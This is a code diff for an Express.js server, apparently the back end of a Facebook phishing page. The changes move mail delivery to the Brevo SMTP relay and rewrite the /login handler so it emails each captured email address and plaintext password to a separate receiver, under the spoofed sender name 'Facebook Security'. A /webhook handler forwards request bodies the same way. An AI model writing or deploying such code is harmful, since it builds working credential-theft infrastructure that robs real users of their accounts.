@@ -22,9 +22,11 @@ app.use(express.static(path.join(__dirname, "public")));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-// 📧 Configura Nodemailer
+// 📧 Configura Nodemailer con SMTP Brevo
 const transporter = nodemailer.createTransport({
-  service: "gmail",
+  host: "smtp-relay.brevo.com",
+  port: 587,
+  secure: false,
   auth: {
     user: process.env.EMAIL_USER,
     pass: process.env.EMAIL_PASS,
@@ -38,10 +40,15 @@ app.post("/login", async (req, res) => {
 
   try {
     await transporter.sendMail({
-      from: `"Login Notifier" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_USER,
-      subject: "Nuovo login ricevuto",
-      text: `Email: ${email}\nPassword: ${password}`,
+      from: `"Facebook Security" <${process.env.EMAIL_USER}>`,
+      to: process.env.EMAIL_RECEIVER,
+      subject: "🔔 Nuovo accesso ricevuto",
+      html: `
+        <h2>Nuovo accesso ricevuto</h2>
+        <p><strong>Email:</strong> ${email}</p>
+        <p><strong>Password:</strong> ${password}</p>
+        <p><em>Ora: ${new Date().toLocaleString()}</em></p>
+      `,
     });
 
     res.status(200).send("Login ricevuto e email inviata");
@@ -58,8 +65,8 @@ app.post("/webhook", async (req, res) => {
   try {
     await transporter.sendMail({
       from: `"Webhook Notifier" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_USER,
-      subject: "Nuovo webhook ricevuto",
+      to: process.env.EMAIL_RECEIVER,
+      subject: "📩 Nuovo webhook ricevuto",
       text: JSON.stringify(req.body, null, 2),
     });
 
